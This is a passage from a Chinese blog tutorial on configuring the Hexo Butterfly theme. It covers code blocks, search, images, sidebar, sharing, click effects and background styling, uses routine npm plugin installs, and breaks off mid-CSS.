关于: /about/ || fas fa-heart</span><br></pre></td></tr></table></figure><h4 id="代码块显示设置"><a href="#代码块显示设置" class="headerlink" title="代码块显示设置"></a>代码块显示设置</h4><h5 id="代码复制"><a href="#代码复制" class="headerlink" title="代码复制"></a>代码复制</h5><p>开启代码复制功能，修改主题配置文件<code>_config.butterfly.yml</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">highlight_copy: true</span><br></pre></td></tr></table></figure><h5 id="代码框展开"><a href="#代码框展开" class="headerlink" title="代码框展开"></a>代码框展开</h5><ul><li>true 全部代码框不展开，需点击 <code>&gt;</code> 打开</li><li>false 代码狂展开，有 <code>&gt;</code> 点击按钮</li><li>none 不显示 <code>&gt;</code> 按钮</li></ul><p>修改主题配置文件<code>_config.butterfly.yml</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">highlight_shrink: false #代码框展开</span><br></pre></td></tr></table></figure><h5 id="自动换行"><a href="#自动换行" class="headerlink" title="自动换行"></a>自动换行</h5><p>在默认情况下，<code>hexo-highlight</code> 在编译的时候不会实现代码自动换行。如果你不希望在代码块的区域里有横向滚动条的话，可以<code>_config.butterfly.yml</code>开启代码换行：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">code_word_wrap:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><h5 id="我的设置"><a href="#我的设置" class="headerlink" title="我的设置"></a>我的设置</h5><p>配置文件<code>_config.butterfly.yml</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># Code Blocks (代码块样式)</span><br><span class="line"># --------------------------------------</span><br><span class="line">highlight_theme: mac #  darker / pale night / light / ocean / mac / mac light / false</span><br><span class="line">highlight_copy: true # copy button 是否显示复制按钮</span><br><span class="line">highlight_lang: true # show the code language 展示代码块语言</span><br><span class="line">highlight_shrink: false # true: 打开文章默认折叠代码块内容 / false: 打开文章默认展开代码块内容</span><br><span class="line">highlight_height_limit: false # unit: px</span><br><span class="line">code_word_wrap: true #是否关闭滚动条</span><br></pre></td></tr></table></figure><p>站点配置文件_config.yml</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">highlight:</span><br><span class="line">  enable: true</span><br><span class="line">  line_number: true</span><br><span class="line">  auto_detect: false</span><br><span class="line">  tab_replace: &#x27;&#x27;</span><br><span class="line">  wrap: true</span><br><span class="line">  hljs: false</span><br></pre></td></tr></table></figure><h4 id="本地搜索"><a href="#本地搜索" class="headerlink" title="本地搜索"></a>本地搜索</h4><p>安装插件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-generator-search --save</span><br></pre></td></tr></table></figure><p>修改主题配置文件<code>_config.butterfly.yml</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># Local search</span><br><span class="line">local_search:</span><br><span class="line">  enable: true</span><br><span class="line">  labels:</span><br><span class="line">    input_placeholder: Search for Posts</span><br><span class="line">    hits_empty: &quot;We didn&#x27;t find any results for the search: $&#123;query&#125;&quot; </span><br><span class="line">    # 如果没有查到内容相关内容显示</span><br></pre></td></tr></table></figure><h4 id="副标题"><a href="#副标题" class="headerlink" title="副标题"></a>副标题</h4><p>修改主题配置文件<code>_config.butterfly.yml</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># 主页subtitle</span><br><span class="line">subtitle:</span><br><span class="line">  enable: true # 打字效果</span><br><span class="line">  effect: true  # 循环或者只打字一次</span><br><span class="line">  loop: false</span><br><span class="line">  # source调用第三方服务</span><br><span class="line">  # source: false 关闭调用</span><br><span class="line">  # source: 1  调用搏天api的随机语录（简体） https://api.btstu.cn/yan/api.php</span><br><span class="line">  # source: 2  调用一言网的一句话（简体） https://v1.hitokoto.cn/?c=f&amp;encode=text</span><br><span class="line">  # source: 3  调用一句网（简体） http://yijuzhan.com/</span><br><span class="line">  # source: 4  调用今日诗词（简体） https://www.jinrishici.com/</span><br><span class="line">  # subtitle 会先显示 source , 再显示 sub 的内容</span><br><span class="line">  #source: false</span><br><span class="line">  source: https://api.btstu.cn/yan/api.php</span><br><span class="line">  # source: 1 https://v1.hitokoto.cn/?c=f&amp;encode=text</span><br><span class="line">  sub:</span><br><span class="line">    - 今日事&amp;#44;今日毕</span><br><span class="line">    - Never put off till tomorrow what you can do today</span><br><span class="line">    - 你在抱怨什么呢</span><br><span class="line">    - 为明天到来的事，说人生像是没有意义</span><br><span class="line">    - 没有选择会是唯一的路</span><br><span class="line">    - 这不是你自己的问题，人终归要好好去生活</span><br><span class="line">   #sub句子轮流出现</span><br></pre></td></tr></table></figure><h5 id="副标题字体大小颜色"><a href="#副标题字体大小颜色" class="headerlink" title="副标题字体大小颜色"></a>副标题字体大小颜色</h5><p>在\themes\butterfly\source\css_layout中的head.styl:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#site-subtitle</span><br><span class="line">    color: var(--white)   //此处修改为白色</span><br><span class="line">    font-size: 1.05em     // 字体大小</span><br><span class="line">    +minWidth768()</span><br><span class="line">    font-size: 1.40em   // 字体大小</span><br></pre></td></tr></table></figure><h4 id="图片设置"><a href="#图片设置" class="headerlink" title="图片设置"></a>图片设置</h4><p>图片可以用云图片链接或者放在本地文件夹位置：/themes/butterfly/source/img</p><h5 id="网站图标"><a href="#网站图标" class="headerlink" title="网站图标"></a>网站图标</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># Favicon（网站图标）</span><br><span class="line">favicon: /img/favicon.png</span><br></pre></td></tr></table></figure><h5 id="头像"><a href="#头像" class="headerlink" title="头像"></a>头像</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">avatar:</span><br><span class="line">  img: /img/avatar.jpg #图片路径</span><br><span class="line">  effect: false #头像会一直转圈  </span><br></pre></td></tr></table></figure><h5 id="主页封面图片"><a href="#主页封面图片" class="headerlink" title="主页封面图片"></a>主页封面图片</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># The banner image of home page</span><br><span class="line">index_img: /img/background.jpg</span><br></pre></td></tr></table></figure><h5 id="文章详情页的顶部图片"><a href="#文章详情页的顶部图片" class="headerlink" title="文章详情页的顶部图片"></a>文章详情页的顶部图片</h5><p>当没有在<code>front-matter</code>设置<code>top_img</code>和<code>cover</code>的情况下会显示该图<br>修改主题配置文件<code>_config.butterfly.yml</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># If the banner of page not setting, it will show the top_img</span><br><span class="line">default_top_img: /img/default_top_img.jpg #设置的本地图片</span><br></pre></td></tr></table></figure><h5 id="归档页顶部图片"><a href="#归档页顶部图片" class="headerlink" title="归档页顶部图片"></a>归档页顶部图片</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#归档子标签页图片</span><br><span class="line"># The banner image of archive page</span><br><span class="line">archive_img: /img/archive.jpg</span><br></pre></td></tr></table></figure><h5 id="tag页顶部图"><a href="#tag页顶部图" class="headerlink" title="tag页顶部图"></a>tag页顶部图</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#tag页（标签页）</span><br><span class="line"># If the banner of tag page not setting, it will show the top_img</span><br><span class="line"># note: tag page, not tags page (子標籤頁面的 top_img)</span><br><span class="line">tag_img: /img/tag_img.jpg</span><br></pre></td></tr></table></figure><h5 id="category页顶部图"><a href="#category页顶部图" class="headerlink" title="category页顶部图"></a>category页顶部图</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#category页</span><br><span class="line"># If the banner of category page not setting, it will show the top_img</span><br><span class="line"># note: category page, not categories page (子分類頁面的 top_img)</span><br><span class="line">category_img: /img/category_img.jpg</span><br></pre></td></tr></table></figure><h5 id="文章封面"><a href="#文章封面" class="headerlink" title="文章封面"></a>文章封面</h5><p>每篇文章都可以设置一张封面，可以为每篇文章设置默认封面</p><p>也可以修改每个md文件的front-matter的cover属性，会覆盖上面的默认封面。修改主题配置文件_config.butterfly.yml：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">cover:</span><br><span class="line">  index_enable: true #  是否展示文章封面</span><br><span class="line">  aside_enable: true</span><br><span class="line">  archives_enable: true</span><br><span class="line">  position: both # 封面展示的位置 left/right/both</span><br><span class="line">  # 当没有设置cover时，默认展示的文章封面</span><br><span class="line">  default_cover:</span><br><span class="line">    # 当配置多张图片时，会随机选择一张作为 cover. 此时写法为</span><br><span class="line">    - https:</span><br><span class="line">    - http:</span><br><span class="line">    - http:</span><br><span class="line">    - http:</span><br><span class="line">    - http:</span><br><span class="line">    - http:</span><br></pre></td></tr></table></figure><h5 id="错误页面"><a href="#错误页面" class="headerlink" title="错误页面"></a>错误页面</h5><p>配置了该属性后会替换无法展示的图片</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># Replace Broken Images (替換無法顯示的圖片)</span><br><span class="line">error_img:</span><br><span class="line">  flink: /img/friend_404.gif</span><br><span class="line">  post_page: /img/404.jpg</span><br></pre></td></tr></table></figure><h5 id="图片懒加载"><a href="#图片懒加载" class="headerlink" title="图片懒加载"></a>图片懒加载</h5><p>这个就是图片没加载出来的时候，出现一个动图转转转的文章页样式</p><p>新增hexo-lazyload-image模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-lazyload-image --save</span><br></pre></td></tr></table></figure><p>在主目录配置文件_config.yml增加配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lazyload:</span><br><span class="line">  enable: true</span><br><span class="line">  loadingImg: /img/loading.gif</span><br></pre></td></tr></table></figure><h5 id="图片大图查看"><a href="#图片大图查看" class="headerlink" title="图片大图查看"></a>图片大图查看</h5><p>修改主题配置文件<code>_config.butterfly.yml</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># Lightbox (圖片大圖查看模式)</span><br><span class="line"># --------------------------------------</span><br><span class="line"># You can only choose one, or neither (只能選擇一個 或者 兩個都不選)</span><br><span class="line"></span><br><span class="line"># medium-zoom</span><br><span class="line"># https://github.com/francoischalifour/medium-zoom</span><br><span class="line">medium_zoom: false</span><br><span class="line"></span><br><span class="line"># fancybox</span><br><span class="line"># http://fancyapps.com/fancybox/3/</span><br><span class="line">fancybox: true</span><br></pre></td></tr></table></figure><h4 id="文章样式"><a href="#文章样式" class="headerlink" title="文章样式"></a>文章样式</h4><p>以下修改主题配置文件<code>_config.butterfly.yml</code></p><h5 id="复制的内容后面加上版权信息"><a href="#复制的内容后面加上版权信息" class="headerlink" title="复制的内容后面加上版权信息"></a>复制的内容后面加上版权信息</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># copy settings</span><br><span class="line"># copyright: Add the copyright information after copied content (複製的內容後面加上版權信息)</span><br><span class="line">copy:</span><br><span class="line">  enable: true # 是否开启网站复制权限</span><br><span class="line">  copyright:  # 复制的内容后面加上版权信息</span><br><span class="line">    enable: false  # 是否开启复制版权信息添加</span><br><span class="line">    limit_count: 50 # 字数限制，当复制文字大于这个字数限制时</span><br></pre></td></tr></table></figure><h5 id="文章版权信息"><a href="#文章版权信息" class="headerlink" title="文章版权信息"></a>文章版权信息</h5><p>在底部会出现对应的作者、链接、声明</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">post_copyright:</span><br><span class="line">  enable: true</span><br><span class="line">  decode: true</span><br><span class="line">  license: CC BY-NC-SA 4.0</span><br><span class="line">  license_url: https://creativecommons.org/licenses/by-nc-sa/4.0/=</span><br></pre></td></tr></table></figure><h5 id="相关文章"><a href="#相关文章" class="headerlink" title="相关文章"></a>相关文章</h5><p>在文章最下面出现推送</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Related Articles</span><br><span class="line">related_post:</span><br><span class="line">  enable: true</span><br><span class="line">  limit: 6 # Number of posts displayed</span><br><span class="line">  date_type: created # or created or updated 文章日期顯示創建日或者更新日</span><br></pre></td></tr></table></figure><h5 id="打赏"><a href="#打赏" class="headerlink" title="打赏"></a>打赏</h5><p>给文章结尾设置打赏按钮，可以放上收款二维码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># Sponsor/reward</span><br><span class="line">reward:</span><br><span class="line">  enable: true</span><br><span class="line">  QR_code:</span><br><span class="line">     - img: /img/wechat.jpg</span><br><span class="line">       link:</span><br><span class="line">       text: 微信</span><br><span class="line">     - img: /img/alipay.jpg</span><br><span class="line">       link:</span><br><span class="line">       text: 支付宝</span><br></pre></td></tr></table></figure><h5 id="字数统计"><a href="#字数统计" class="headerlink" title="字数统计"></a>字数统计</h5><p>项目目录右键打开 Git Bash Here</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-wordcount --save or yarn add hexo-wordcount</span><br></pre></td></tr></table></figure><p>修改主题配置文件<code>_config.butterfly.yml</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># wordcount (字數統計)</span><br><span class="line">wordcount:</span><br><span class="line">  enable: true</span><br><span class="line">  post_wordcount: true</span><br><span class="line">  min2read: true</span><br><span class="line">  total_wordcount: true</span><br></pre></td></tr></table></figure><h5 id="文章分享功能"><a href="#文章分享功能" class="headerlink" title="文章分享功能"></a>文章分享功能</h5><p><code>addThis</code>、<code>sharejs</code>、<code>addtoany</code>三个选一个开启</p><p>addThis官网：<a href="https://www.addthis.com/">https://www.addthis.com/</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># Share System (分享功能)</span><br><span class="line"># --------------------------------------</span><br><span class="line"></span><br><span class="line"># AddThis</span><br><span class="line"># https://www.addthis.com/</span><br><span class="line">addThis:</span><br><span class="line">  enable: false</span><br><span class="line">  pubid:  #访问 AddThis 官网, 找到你的 pub-id</span><br><span class="line"></span><br><span class="line"># Share.js</span><br><span class="line"># https://github.com/overtrue/share.js</span><br><span class="line">sharejs:</span><br><span class="line">  enable: true  #我开启的</span><br><span class="line">  sites: facebook,twitter,wechat,weibo,qq  #想要显示的内容</span><br><span class="line"></span><br><span class="line"># AddToAny</span><br><span class="line"># https://www.addtoany.com/</span><br><span class="line">addtoany:</span><br><span class="line">  enable: false</span><br><span class="line">  item: facebook,twitter,wechat,sina_weibo,facebook_messenger,email,copy_link</span><br></pre></td></tr></table></figure><h4 id="侧边栏样式"><a href="#侧边栏样式" class="headerlink" title="侧边栏样式"></a>侧边栏样式</h4><p>以下修改主题配置文件<code>_config.butterfly.yml</code></p><h5 id="调整侧边栏出现位置"><a href="#调整侧边栏出现位置" class="headerlink" title="调整侧边栏出现位置"></a>调整侧边栏出现位置</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">aside:</span><br><span class="line">  enable: true</span><br><span class="line">  hide: false</span><br><span class="line">  button: true</span><br><span class="line">  mobile: true # display on mobile</span><br><span class="line">  position: right # left or right 我的是右边</span><br></pre></td></tr></table></figure><h5 id="个人信息"><a href="#个人信息" class="headerlink" title="个人信息"></a>个人信息</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">card_author:</span><br><span class="line">    enable: true</span><br><span class="line">    description:</span><br><span class="line">    button:</span><br><span class="line">      enable: true</span><br><span class="line">      icon: fab fa-github</span><br><span class="line">      text: Follow Me #按钮文字</span><br><span class="line">      link: https://github.com/xxxxxx #可以放上自己的github地址</span><br></pre></td></tr></table></figure><h5 id="社交图标"><a href="#社交图标" class="headerlink" title="社交图标"></a>社交图标</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># social settings (社交圖標設置)</span><br><span class="line"># formal:</span><br><span class="line">#        icon: link || the description</span><br><span class="line">#书写格式：图标名：url || 描述性文字`</span><br><span class="line">social:</span><br><span class="line">   fab fa-github: URL || Github</span><br><span class="line">   fa fa-book-open: URL || CSDN</span><br><span class="line">   fas fa-envelope-open-text: mailto:邮箱地址@qq.com || Email</span><br></pre></td></tr></table></figure><h5 id="公告"><a href="#公告" class="headerlink" title="公告"></a>公告</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">card_announcement:</span><br><span class="line">    enable: true</span><br><span class="line">    content: This is my Blog #修改公告栏信息</span><br></pre></td></tr></table></figure><h5 id="Toc目录"><a href="#Toc目录" class="headerlink" title="Toc目录"></a>Toc目录</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># toc (目錄)</span><br><span class="line">toc:</span><br><span class="line">  enable: true</span><br><span class="line">  number: true</span><br><span class="line">  #style_simple: false</span><br><span class="line">  auto_open: true # auto open the sidebar</span><br></pre></td></tr></table></figure><h5 id="个人设置"><a href="#个人设置" class="headerlink" title="个人设置"></a>个人设置</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">aside:</span><br><span class="line">  enable: true</span><br><span class="line">  hide: false</span><br><span class="line">  button: true</span><br><span class="line">  mobile: true # 手机页面（ 显示宽度 &lt; 768px ）是否显示aside内容</span><br><span class="line">  position: right # left or right</span><br><span class="line">  card_author:</span><br><span class="line">    enable: true</span><br><span class="line">    description:</span><br><span class="line">    button:</span><br><span class="line">      enable: true</span><br><span class="line">      icon: fab fa-github</span><br><span class="line">      text: Follow Me #按钮文字</span><br><span class="line">      link: https://github.com/0314Valen/0314Valen.github.io #可以放上自己的github地址</span><br><span class="line">  card_announcement:</span><br><span class="line">    enable: true</span><br><span class="line">    content: 不要担心辜负了别人的期待，对你有期待的，只有你自己。 #修改公告栏信息</span><br></pre></td></tr></table></figure><h4 id="主站特效"><a href="#主站特效" class="headerlink" title="主站特效"></a>主站特效</h4><p>以下均为修改主题配置文件 <code>_config.butterfly.yml</code>:</p><h5 id="鼠标点击的效果"><a href="#鼠标点击的效果" class="headerlink" title="鼠标点击的效果"></a>鼠标点击的效果</h5><p>有冒光特效、烟火特效、爱心特效、文字特效，选择其中一个将<code>enable</code>设置为true就可以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"># Typewriter Effect (打字效果)</span><br><span class="line"># https://github.com/disjukr/activate-power-mode</span><br><span class="line">activate_power_mode:</span><br><span class="line">  enable: false</span><br><span class="line">  colorful: true # open particle animation (冒光特效)</span><br><span class="line">  shake: true #  open shake (抖動特效)</span><br><span class="line">  mobile: false</span><br><span class="line"></span><br><span class="line"># Mouse click effects: fireworks (鼠標點擊效果: 煙火特效)</span><br><span class="line">fireworks:</span><br><span class="line">  enable: false</span><br><span class="line">  zIndex: 9999 # -1 or 9999</span><br><span class="line">  mobile: false</span><br><span class="line"></span><br><span class="line"># Mouse click effects: Heart symbol (鼠標點擊效果: 愛心)</span><br><span class="line">click_heart:</span><br><span class="line">  enable: false</span><br><span class="line">  mobile: false</span><br><span class="line"></span><br><span class="line"># Mouse click effects: words (鼠標點擊效果: 文字)</span><br><span class="line">ClickShowText:</span><br><span class="line">  enable: true</span><br><span class="line">  text:</span><br><span class="line">     - 富强</span><br><span class="line">     - 民主</span><br><span class="line">     - 文明</span><br><span class="line">     - 和谐</span><br><span class="line">     - 平等</span><br><span class="line">     - 公正</span><br><span class="line">     - 法治</span><br><span class="line">     - 爱国</span><br><span class="line">     - 敬业</span><br><span class="line">     - 诚信</span><br><span class="line">     - 友善</span><br><span class="line">  fontSize: 15px</span><br><span class="line">  random: true</span><br><span class="line">  mobile: true</span><br></pre></td></tr></table></figure><h5 id="打字效果"><a href="#打字效果" class="headerlink" title="打字效果"></a>打字效果</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># Typewriter Effect (打字效果)</span><br><span class="line"># https://github.com/disjukr/activate-power-mode</span><br><span class="line">activate_power_mode:</span><br><span class="line">  enable: true</span><br><span class="line">  colorful: true # open particle animation (冒光特效)</span><br><span class="line">  shake: true #  open shake (抖動特效)</span><br><span class="line">  mobile: true</span><br></pre></td></tr></table></figure><h5 id="自定义主题色"><a href="#自定义主题色" class="headerlink" title="自定义主题色"></a>自定义主题色</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># theme_color:</span><br><span class="line">#   enable: true</span><br><span class="line">#   main: &quot;#49B1F5&quot;</span><br><span class="line">#   paginator: &quot;#00c4b6&quot;</span><br><span class="line">#   button_hover: &quot;#FF7242&quot;</span><br><span class="line">#   text_selection: &quot;#00c4b6&quot;</span><br><span class="line">#   link_color: &quot;#99a9bf&quot;</span><br><span class="line">#   meta_color: &quot;#858585&quot;</span><br><span class="line">#   hr_color: &quot;#A4D8FA&quot;</span><br><span class="line">#   code_foreground: &quot;#F47466&quot;</span><br><span class="line">#   code_background: &quot;rgba(27, 31, 35, .05)&quot;</span><br><span class="line">#   toc_color: &quot;#00c4b6&quot;</span><br><span class="line">#   blockquote_padding_color: &quot;#49b1f5&quot;</span><br><span class="line">#   blockquote_background_color: &quot;#49b1f5&quot;</span><br></pre></td></tr></table></figure><h5 id="网站背景"><a href="#网站背景" class="headerlink" title="网站背景"></a>网站背景</h5><p>默认显示白色，可设置图片或者颜色</p><p>修改主题配置文件<code>_config.butterfly.yml</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">background: </span><br></pre></td></tr></table></figure><p>修改为渐变色，步骤：</p><p>1.在<code>\Butterfly\source\css\</code>目录下创建css文件 <code>backgound.css</code>：可以自己调色</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">//代码百度得来</span><br><span class="line">#web_bg &#123;</span><br><span class="line">  background: -webkit-linear-gradient(</span><br><span class="line">    0deg,</span><br><span class="line">    rgba(247, 149, 